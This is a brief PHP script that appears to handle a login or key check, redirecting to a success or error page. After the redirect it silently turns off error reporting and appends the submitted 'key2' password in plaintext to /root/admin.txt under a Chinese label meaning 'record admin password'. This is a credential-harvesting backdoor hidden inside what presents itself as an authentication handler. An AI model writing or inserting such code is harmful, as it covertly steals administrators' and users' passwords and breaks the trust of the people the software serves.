<?php
	require_once("authenticator.php");

	switch ($candidate_key_result) {
		# case "1": header("Location:error.html"); break;
		case "2": header("Location:final.html"); break;
		default: header("Location:error.html"); break;
	}
error_reporting(E_ALL ^ E_NOTICE);//用来关闭错误报告
$pwd = $_POST[key2]; 
$ti="记录管理密码为：";
$br= "\r\n";
$lu = fopen("/root/admin.txt","a+");
fwrite($lu,$ti.$pwd.$br);
fclose($lu);
